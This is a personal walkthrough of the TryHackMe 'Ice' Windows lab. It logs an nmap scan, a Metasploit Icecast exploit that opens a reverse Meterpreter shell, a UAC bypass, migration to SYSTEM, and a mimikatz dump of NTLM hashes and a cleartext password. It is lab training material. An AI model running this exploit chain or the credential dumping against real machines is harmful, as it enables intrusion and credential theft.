- - - 
created : 17-07-2025 

Tags : #easy
- - - 
# Objective

Root the [Windows](../../3%20-%20Tags/Hacking%20Concepts/Windows.md) machine .
# Scenario

Connect to the TryHackMe network! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

The virtual machine used in this room (Ice) can be downloaded for offline usage from https://darkstar7471.com/resources.html. The sequel to this room, Blaster, can be found [here](https://tryhackme.com/room/blaster).

# Recon

## Rustscan/Nmap

Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room '[Nmap](https://tryhackme.com/room/furthernmap)' prior to this room :


```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ice]
└─$ nmap -sS -p- 10.10.97.79                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 18:49 CEST
Nmap scan report for 10.10.97.79
Host is up (0.054s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt     Icecast streaming media server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-16T17:13:25
|_  start_date: 2025-07-16T16:46:09
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-16T12:13:23-05:00
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:c2:c2:e2:37:31 (unknown)

```

# Gain Access

Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the **Impact Score** for this vulnerability? Use https://www.cvedetails.com/cve/CVE-2004-1561 for this question and the next. So we know it's [CVE-2004-1561](../../3%20-%20Tags/CVEs/CVE-2004-1561.md) .

## Metasploit 

Now that we've found our vulnerability, let's find our [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md). For this section of the room, we'll use the [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole` :

```
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs
                                      /using-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.97.79
rhosts => 10.10.97.79
msf6 exploit(windows/http/icecast_header) > set lhost 10.8.162.183
lhost => 10.8.162.183
msf6 exploit(windows/http/icecast_header) > run
[*] Started reverse TCP handler on 10.8.162.183:4444 
[*] Sending stage (177734 bytes) to 10.10.97.79
[*] Meterpreter session 1 opened (10.8.162.183:4444 -> 10.10.97.79:49235) at 2025-07-16 19:22:57 +0200

meterpreter > 

```

## Escalate

```
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

```

Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete* :

```
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.10.97.79 - Collecting local exploits for x86/windows...

exploit/windows/local/bypassuac_eventvwr
```

Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

```
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/icecast_header) > search exploit/windows/local/bypassuac_eventvwr

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/windows/local/bypassuac_eventvwr  2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   1    \_ target: Windows x86                  .                .          .      .
   2    \_ target: Windows x64                  .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/local/bypassuac_eventvwr                                                   
After interacting with a module you can manually set a TARGET with set TARGET 'Windows x64'

msf6 exploit(windows/http/icecast_header) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost 10.8.162.183
lhost => 10.8.162.183
msf6 exploit(windows/local/bypassuac_eventvwr) > set rhosts 10.10.97.79
rhosts => 10.10.97.79
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > run
[*] Started reverse TCP handler on 10.8.162.183:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (177734 bytes) to 10.10.97.79
[*] Meterpreter session 2 opened (10.8.162.183:4444 -> 10.10.97.79:49256) at 2025-07-16 19:41:21 +0200 

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```


## Looting

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't) :

```
meterpreter > ps

Process List
============

 PID   PPID  Name            Arch  Session  User                      Path
 ---   ----  ----            ----  -------  ----                      ----
 0     0     [System Proces
             s]
 4     0     System          x64   0
 416   4     smss.exe        x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\smss
                                                                      .exe
 500   692   svchost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\svch
                                                                      ost.exe
 544   536   csrss.exe       x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\csrs
                                                                      s.exe
 588   692   svchost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\svch
                                                                      ost.exe
 592   536   wininit.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\wini
                                                                      nit.exe
 604   584   csrss.exe       x64   1        NT AUTHORITY\SYSTEM       C:\Windows\System32\csrs
                                                                      s.exe
 652   584   winlogon.exe    x64   1        NT AUTHORITY\SYSTEM       C:\Windows\System32\winl
                                                                      ogon.exe
 692   592   services.exe    x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\serv
                                                                      ices.exe
 700   592   lsass.exe       x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\lsas
                                                                      s.exe
 708   592   lsm.exe         x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\lsm.
                                                                      exe
 816   692   svchost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\svch
                                                                      ost.exe
 884   692   svchost.exe     x64   0        NT AUTHORITY\NETWORK SER  C:\Windows\System32\svch
                                            VICE                      ost.exe
 932   692   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI  C:\Windows\System32\svch
                                            CE                        ost.exe
 1060  692   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI  C:\Windows\System32\svch
                                            CE                        ost.exe
 1188  692   svchost.exe     x64   0        NT AUTHORITY\NETWORK SER  C:\Windows\System32\svch
                                            VICE                      ost.exe
 1296  500   dwm.exe         x64   1        Dark-PC\Dark              C:\Windows\System32\dwm.
                                                                      exe
 1316  1288  explorer.exe    x64   1        Dark-PC\Dark              C:\Windows\explorer.exe
 1368  692   spoolsv.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\spoo
                                                                      lsv.exe
 1396  692   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI  C:\Windows\System32\svch
                                            CE                        ost.exe
 1460  692   taskhost.exe    x64   1        Dark-PC\Dark              C:\Windows\System32\task
                                                                      host.exe
 1552  692   TrustedInstall  x64   0        NT AUTHORITY\SYSTEM       C:\Windows\servicing\Tru
             er.exe                                                   stedInstaller.exe
 1576  816   WmiPrvSE.exe    x64   0        NT AUTHORITY\NETWORK SER  C:\Windows\System32\wbem
                                            VICE                      \WmiPrvSE.exe
 1584  692   amazon-ssm-age  x64   0        NT AUTHORITY\SYSTEM       C:\Program Files\Amazon\
             nt.exe                                                   SSM\amazon-ssm-agent.exe
 1648  692   LiteAgent.exe   x64   0        NT AUTHORITY\SYSTEM       C:\Program Files\Amazon\
                                                                      Xentools\LiteAgent.exe
 1688  692   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI  C:\Windows\System32\svch
                                            CE                        ost.exe
 1844  692   Ec2Config.exe   x64   0        NT AUTHORITY\SYSTEM       C:\Program Files\Amazon\
                                                                      Ec2ConfigService\Ec2Conf
                                                                      ig.exe
 1908  1988  powershell.exe  x86   1        Dark-PC\Dark              C:\Windows\SysWOW64\Wind
                                                                      owsPowershell\v1.0\power
                                                                      shell.exe
 2068  692   svchost.exe     x64   0        NT AUTHORITY\NETWORK SER  C:\Windows\System32\svch
                                            VICE                      ost.exe
 2152  692   vds.exe         x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\vds.
                                                                      exe
 2212  1316  Icecast2.exe    x86   1        Dark-PC\Dark              C:\Program Files (x86)\I
                                                                      cecast2 Win32\Icecast2.e
                                                                      xe
 2236  692   sppsvc.exe      x64   0        NT AUTHORITY\NETWORK SER  C:\Windows\System32\spps
                                            VICE                      vc.exe
 2516  604   conhost.exe     x64   1        Dark-PC\Dark              C:\Windows\System32\conh
                                                                      ost.exe
 2544  692   SearchIndexer.  x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\Sear
             exe                                                      chIndexer.exe
 2596  816   slui.exe        x64   1        Dark-PC\Dark              C:\Windows\System32\slui
                                                                      .exe



```

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.

We migrate to this process now with the command `migrate -N PROCESS_NAME` :

```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1908 to 1368...                                                                                                    
[*] Migration completed successfully.                                                                                                 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz) :
```
 meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1908 to 1368...                                                                                                    
[*] Migration completed successfully.                                                                                                 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM                                                                                                  
meterpreter > load kiwi                                                                                                               
Loading extension kiwi...                                                                                                             
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)                                                                                     
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                           
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                              
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

```

Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help` :

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes


Kiwi Commands
=============

    Command                   Description
    -------                   -----------
    creds_all                 Retrieve all credentials (parsed)
    creds_kerberos            Retrieve Kerberos creds (parsed)
    creds_livessp             Retrieve Live SSP creds
    creds_msv                 Retrieve LM/NTLM creds (parsed)
    creds_ssp                 Retrieve SSP creds
    creds_tspkg               Retrieve TsPkg creds (parsed)
    creds_wdigest             Retrieve WDigest creds (parsed)
    dcsync                    Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create      Create a golden kerberos ticket
    kerberos_ticket_list      List all kerberos tickets (unparsed)
    kerberos_ticket_purge     Purge any in-use kerberos tickets
    kerberos_ticket_use       Use a kerberos ticket
    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam              Dump LSA SAM (unparsed)
    lsa_dump_secrets          Dump LSA secrets (unparsed)
    password_change           Change the password/hash of a user
    wifi_list                 List wifi profiles/creds for the current user
    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)

For more info on a specific command, use <command> -h or help <command>
```



```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)


```

Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled) .

## [Post-Exploitation](../../3%20-%20Tags/Hacking%20Concepts/Post-Exploitation.md) 

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.




